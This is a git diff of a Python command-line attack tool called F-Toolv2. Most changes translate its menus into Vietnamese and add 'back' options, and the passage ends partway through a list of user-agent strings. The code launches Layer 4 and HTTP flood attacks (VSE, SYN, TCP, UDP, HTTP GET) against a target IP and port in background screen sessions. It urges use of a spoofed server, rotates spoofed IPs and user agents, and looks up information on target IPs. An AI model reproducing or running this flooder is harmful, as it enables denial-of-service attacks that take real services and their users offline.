@@ -70,6 +70,7 @@ class Home:
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" WebTool")
 		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" L4/L7/BBoS")
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SpeedTest")
+		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
 		print("\n")
 		while True:
 			try:
@@ -102,6 +103,8 @@ class Home:
 				elif option in ['stop', 'STOP']:
 					subprocess.run(['pkill screen'], shell=True)
 					print(f"{Color.LG} [!] tấn công dừng lại!")
+				elif option in ['00', '0']:
+					os.system('clear');self.bbos()	
 				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
 					os.system('clear');Tool.bbos()
 				elif option == "":
@@ -133,16 +136,16 @@ class response_url:
 	def ip_lookup(self, ip):
 		try:
 			if ip == '':
-				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
+				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Địa chỉ IP không hợp lệ"
 			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname", headers=self.headers).json()
 			if resp['status'] == 'success':
 				return Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])#copyright by daudau
 			else:
-				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
+				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Địa chỉ IP không hợp lệ"
 		except KeyError:
-			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
+			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Địa chỉ IP không hợp lệ"
 		except requests.exceptions.ConnectionError:
-			return Color.LR+"Error: Check your Internet Connection."
+			return Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn."
 
 	def http_status(self, url):
 		try:
@@ -150,72 +153,72 @@ class response_url:
 				url = "http://"+url
 			resp = httpx.get(url, headers=self.headers)
 			if resp.status_code == 200:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (OK)"
+				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (OK)"
 			elif resp.status_code == 301:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Moved Permanently)"
+				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Đã di chuyển vĩnh viễn)"
 			elif resp.status_code == 302:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Found)"
+				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Thành lập)"
 			elif resp.status_code == 303:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (See Other)"
+				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Xem Khác)"
 			elif resp.status_code == 307:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Temporary Redirect)"
+				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Chuyển hướng tạm thời)"
 			elif resp.status_code == 400:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Unauthorized)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Không được phép)"
 			elif resp.status_code == 410:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gone)"
+				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Đi mất)"
 			elif resp.status_code == 401:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Requests)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Yêu cầu xấu)"
 			elif resp.status_code == 403:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Forbidden)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Cấm)"
 			elif resp.status_code == 404:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Not Found)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (không tìm thấy)"
 			elif resp.status_code == 429:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (To Many Requests)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Nhiều yêu cầu)"
 			elif resp.status_code == 500:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Internal Server Error)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Lỗi máy chủ nội bộ)"
 			elif resp.status_code == 502:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Gateway)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Cổng xấu)"
 			elif resp.status_code == 503:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Service Unavailable)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (dịch vụ Không sẵn có)"
 			elif resp.status_code == 504:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gateway Timeout)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Cổng Time-out)"
 			elif resp.status_code == 507:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Insufficient Storage)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Không đủ bộ nhớ)"
 			elif resp.status_code == 508:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Loop Detected)"
+				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Đã phát hiện vòng lặp)"
 			else:
-				return Color.LR+f"    [+] Result: (Connection timeout)"
+				return Color.LR+f"    [+] Kết quả: (Hết thời gian kết nối)"
 
 		except httpx.TimeoutException:
-			return Color.LR+f"     [+] Result: (Connection timeout)"
+			return Color.LR+f"     [+] Kết quả: (Hết thời gian kết nối)"
 		except httpx.ConnectError:
-			return Color.LR+f"    [+] Result: Error occurred"
+			return Color.LR+f"    [+] Kết quả: Đã xảy ra lỗi"
 		except httpx.UnsupportedProtocol:
-			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
+			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"
 
 	def findhost(self, host):
 		try:
 			resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={host}", headers=self.headers)
 
 			if resp.text == 'error invalid host':
-				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
+				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"
 			else:
 				return Color.LG+resp.text
 		except requests.exceptions.ConnectionError:
-			return Color.LR+"Error: Check your Internet Connection."
+			return Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn."
 
 	def extractlink(self, url):
 		try:
 			resp = requests.get(f"https://api.hackertarget.com/pagelinks/?q={url}", headers=self.headers)
 
 			if resp.text == "input url is invalid":
-				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
+				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"
 			elif resp.text == "error getting links":
-				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" No Links Found!"
+				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Không Tìm Thấy Links!"
 			else:
 				return Color.LG+resp.text
 		except requests.exceptions.ConnectionError:
-			return Color.LR+"Error: Check your Internet Connection."
+			return Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn."
 
 
 class Tool:
@@ -232,12 +235,12 @@ class Tool:
 			with open("utils/url.json", 'r') as p:
 				readjson = json.loads(p.read())
 		except FileNotFoundError:
-			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'utils' NotFound")
+			sys.exit(f"{Color.LR}LỖI:{Color.RESET} File: 'utils' Không tìm thấy")
 		if new in ['ref', 'REF', 'clear', 'CLEAR']:
 			os.system('clear')
-			F_Tool.styleText("[*] Downloading New Proxy...")
+			F_Tool.styleText("[*] Đang tải xuống Proxy mới...")
 		else:
-			F_Tool.styleText("[*] Downloading All Proxy...")
+			F_Tool.styleText("[*] Đang tải xuống tất cả proxy...")
 		try:
 			for proxy in readjson['Proxies']:
 				if proxy['type'] == 1:
@@ -254,7 +257,7 @@ class Tool:
 						socks5 = requests.get(proxy["url"], headers=self.headers).text
 			os.system('clear')
 		except requests.exceptions.ConnectionError:
-			sys.exit(Color.LR+"\nError: Check your Internet Connection.")
+			sys.exit(Color.LR+"\nLỗi: Kiểm tra kết nối Internet của bạn.")
 		print(f"""{Color.LG}
 
      ___               _
@@ -269,6 +272,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTPS PROXY")
 		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" SOCKS4 PROXY")
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SOCKS5 PROXY")
+		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
 		print("\n")
 		while True:
 				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
@@ -276,19 +280,19 @@ class Tool:
 				if option in ['01', '1']:
 					with open("http.txt", 'w') as p:
 						p.write(http)
-					print(Color.LG+"[+]"+Color.LC+" HTTP Saved to http.txt")
+					print(Color.LG+"[+]"+Color.LC+" HTTP Đã lưu vào http.txt")
 				elif option in ['02', '2']:
 					with open("https.txt", 'w') as p:
 						p.write(https)
-					print(Color.LG+"[+]"+Color.LC+" HTTPS to https.txt")
+					print(Color.LG+"[+]"+Color.LC+" HTTPS Đã lưu vào https.txt")
 				elif option in ['03', '3']:
 					with open("socks4.txt", 'w') as p:
 						p.write(socks4)
-					print(Color.LG+"[+]"+Color.LC+" SOCKS4 Saved to socks4.txt")
+					print(Color.LG+"[+]"+Color.LC+" SOCKS4 Đã lưu vào socks4.txt")
 				elif option in ['04', '4']:
 					with open("socks5.txt", 'w') as p:
 						p.write(socks5)
-					print(Color.LG+"[+]"+Color.LC+" SOCKS5 Saved to socks5.txt")
+					print(Color.LG+"[+]"+Color.LC+" SOCKS5 Đã lưu vào socks5.txt")
 				elif option in ['ref', 'REF']:
 					self.proxy(option)
 				elif option in ['home', 'HOME']:
@@ -304,13 +308,15 @@ class Tool:
 					subprocess.run(['pkill -f F-Tool.py'], shell=True)
 				elif option in ['stop', 'STOP']:
 					subprocess.run(['pkill screen'], shell=True)
-					print(f"{Color.LG} [!] Attack Stopped!")
+					print(f"{Color.LG} [!] tấn công dừng lại!")
+				elif option in ['00', '0']:
+					os.system('clear');self.bbos()	
 				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
 					os.system('clear');Tool.bbos()
 				elif option == "":
 					pass
 				else:
-					print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
+					print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")
 
 	def webtools(self):
 		print(f"""{Color.LG}
@@ -323,18 +329,19 @@ class Tool:
 
 
 """)
-		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" LOOKUP")
-		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" IP INFO")
-		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP STATUS")
-		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" FIND HOST")
-		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" EXTRACT LINK")
+		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" TRA CỨU")
+		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" THÔNG TIN IP")
+		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TRẠNG THÁI HTTP")
+		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" TÌM MÁY CHỦ")
+		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" TRÍCH LINK")
+		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
 		print("\n")
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				while True:
-					lookup = input(Color.LR+"["+Color.LG+"LOOKUP"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
+					lookup = input(Color.LR+"["+Color.LG+"TRA CỨU"+Color.LR+"]"+Color.LC+" Nhập URL mục tiêu: "+Color.RESET)
 					parser = parse.urlparse(lookup)
 					host = parser.netloc
 					if parser.scheme == 'https' or parser.scheme == 'http':
@@ -347,17 +354,17 @@ class Tool:
 					break
 			elif option in ['02', '2']:
 				while True:
-					ip_lookup = input(Color.LR+"["+Color.LG+"IP INFO"+Color.LR+"]"+Color.LC+" Enter Target IP: "+Color.RESET)
+					ip_lookup = input(Color.LR+"["+Color.LG+"THÔNG TIN IP"+Color.LR+"]"+Color.LC+" Nhập IP mục tiêu: "+Color.RESET)
 					print(response_url(self.headers).ip_lookup(ip_lookup))
 					break
 			elif option in ['03', '3']:
 				while True:
-					http = input(Color.LR+"["+Color.LG+"HTTPCHECK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
+					http = input(Color.LR+"["+Color.LG+"KIỂM TRA HTTP"+Color.LR+"]"+Color.LC+" Nhập URL mục tiêu: "+Color.RESET)
 					print(response_url(self.headers).http_status(http))
 					break
 			elif option in ['04', '4']:
 				while True:
-					findhost = input(Color.LR+"["+Color.LG+"FINDHOST"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
+					findhost = input(Color.LR+"["+Color.LG+"TÌM KIẾM"+Color.LR+"]"+Color.LC+" Nhập URL mục tiêu: "+Color.RESET)
 					parser = parse.urlparse(findhost)
 					host = parser.netloc
 					path = parser.path.replace("/", "")
@@ -368,7 +375,7 @@ class Tool:
 					break
 			elif option in ['05', '5']:
 				while True:
-					excractlink = input(Color.LR+"["+Color.LG+"EXCRACTLINK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
+					excractlink = input(Color.LR+"["+Color.LG+"TRÍCH LINK"+Color.LR+"]"+Color.LC+" Nhập URL mục tiêu: "+Color.RESET)
 					print(response_url(self.headers).extractlink(excractlink))
 					break
 			elif option in ['ref', 'REF']:
@@ -385,13 +392,15 @@ class Tool:
 				subprocess.run(['pkill -f F-Tool.py'], shell=True)
 			elif option in ['stop', 'STOP']:
 				subprocess.run(['pkill screen'], shell=True)
-				print(f"{Color.LG} [!] Attack Stopped!")
+				print(f"{Color.LG} [!] tấn công dừng lại!")
+			elif option in ['00', '0']:
+				os.system('clear');self.bbos()	
 			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
 				os.system('clear');Tool.bbos()
 			elif option == "":
 				pass
 			else:
-				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
+				print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")
 
 	def spdtest(self):
 		print(f"""{Color.LG}
@@ -408,42 +417,43 @@ class Tool:
 		try:
 			spdt = speedtest.Speedtest()
 
-			print(Color.LC+"[*] Loading Server List...")
+			print(Color.LC+"[*] Đang tải danh sách máy chủ...")
 			spdt.get_servers()
 			time.sleep(0.1)
 
-			print(Color.LC+"[*] Choosing Best Server...")
+			print(Color.LC+"[*] Chọn máy chủ tốt nhất...")
 			get = spdt.get_best_server()
 			time.sleep(0.1)
 
 			print(Color.LC+"\n[+] "+Color.LC+"Host:"+Color.LY+f" {get['host']}")
 			time.sleep(0.1)
-			print(Color.LC+"[+] "+Color.LC+"Location:"+Color.LY+f" {get['name']}")
+			print(Color.LC+"[+] "+Color.LC+"Vị trí:"+Color.LY+f" {get['name']}")
 
-			print(Color.LC+"\n[*] Performing Download Test...")
+			print(Color.LC+"\n[*] Thực hiện kiểm tra tải xuống...")
 			download_result = spdt.download()
 
-			print(Color.LC+"[*] Performing Upload Test...")
+			print(Color.LC+"[*] Thực hiện kiểm tra tải lên...")
 			upload_result = spdt.upload()
 			ping_result = spdt.results.ping
 
 			time.sleep(0.1)
-			print(Color.LC+"\nResults:\n")
+			print(Color.LC+"\nKết quả:\n")
 			time.sleep(0.1)
-			print(Color.LC+"[+] Download Speed:"+Color.LY+f" {download_result / 1024 / 1024:.2f} mbps")
+			print(Color.LC+"[+] Tốc độ tải về:"+Color.LY+f" {download_result / 1024 / 1024:.2f} mbps")
 			time.sleep(0.1)
-			print(Color.LC+"[+] Upload Speed:"+Color.LY+f" {upload_result / 1024 / 1024:.2f} mbps")
+			print(Color.LC+"[+] Tốc độ tải lên:"+Color.LY+f" {upload_result / 1024 / 1024:.2f} mbps")
 			time.sleep(0.1)
 			print(Color.LC+"[+] Ping:"+Color.LY+f" {ping_result:.2f} ms")
 			print("\n")
 		except Exception:
-			print(Color.LR+"Error: Check your Internet Connection.\n\n")
+			print(Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn.\n\n")
 
 
 	def bbos(self):
-		print(Color.LR+"\n\n    [>    "+Color.LG+"Please use spoofed server for the best experience."+Color.LR+"    <]\n\n")
+		print(Color.LR+"\n\n    [>    "+Color.LG+"Vui lòng sử dụng máy chủ giả mạo để có trải nghiệm tốt nhất."+Color.LR+"    <]\n\n")
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Layer4")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
+		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
 		print("\n")
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
@@ -464,13 +474,15 @@ class Tool:
 				subprocess.run(['pkill -f F-Tool.py'], shell=True)
 			elif option in ['stop', 'STOP']:
 				subprocess.run(['pkill screen'], shell=True)
-				print(f"{Color.LG} [!] Attack Stopped!")
+				print(f"{Color.LG} [!] tấn công dừng lại!")
+			elif option in ['00', '0']:
+				os.system('clear');self.bbos()	
 			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
 				os.system('clear');Tool.bbos()
 			elif option == "":
 				pass
 			else:
-				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
+				print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")
 
 	def l4(self):
 		print(f"""{Color.LG}
@@ -482,12 +494,12 @@ class Tool:
               |___/
 
 """)
-		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Engine specific flood")
-		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: TCP SYN flood")
-		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: TCP junk flood")
-		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP:  UDP junk flood")
-		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP: HTTP GET request flood")
-		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
+		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Động cơ lũ lụt cụ thể")
+		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: Lũ lụt TCP SYN")
+		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: Lũ rác TCP")
+		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP: Lũ rác UDP")
+		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP: Lũ yêu cầu HTTP GET")
+		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
 		print("\n")
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
@@ -497,48 +509,48 @@ class Tool:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
+					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
 			elif option in ['02', '2']:
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
+					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
 			elif option in ['03', '3']:
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
+					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
 			elif option in ['04', '4']:
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
+					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
 			elif option in ['05', '5']:
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
+					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
 					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
@@ -656,15 +668,15 @@ def spoof_useragents():
 	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
 	spoof_ip.append(IP)
 
-	useragents = ['Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)',
-	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
-	'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
-	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)',
-	'Chrome/34.0.1847.116 Safari/537.36',
-	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
-	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
-	'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
-	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01']
+	useragents = ['Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3519.53 Safari/537.36',
+	'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3533.161 Safari/537.36',
+	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Herring/93.1.8770.71',
+	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36',
+	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 OPR/83.0.4254.27',
+	'Mozilla/5.0 (Linux; Android 10; CPH1823) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36',
+	'Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36',
